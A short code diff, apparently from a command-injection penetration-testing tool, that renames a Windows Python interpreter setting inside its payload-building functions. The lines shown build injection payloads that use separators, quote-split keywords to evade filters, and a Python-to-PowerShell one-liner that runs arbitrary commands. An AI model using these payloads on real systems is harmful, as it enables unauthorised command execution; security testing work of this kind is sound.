@@ -79,9 +79,9 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
     if settings.SKIP_CALC: 
-      python_payload = settings.WIN_PYTHON_DIR + " -c \"print '" + TAG + "'%2B'" + TAG + "'%2B'" + TAG + "'\""
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print '" + TAG + "'%2B'" + TAG + "'%2B'" + TAG + "'\""
     else:
-      python_payload = settings.WIN_PYTHON_DIR + " -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
      
     payload = (separator +
               "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
@@ -153,7 +153,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
     else:
       payload = (separator +
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('" + 
-                settings.WIN_PYTHON_DIR + " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
+                settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
                 "') do @set /p =%i< nul"
                 )
                                                                       
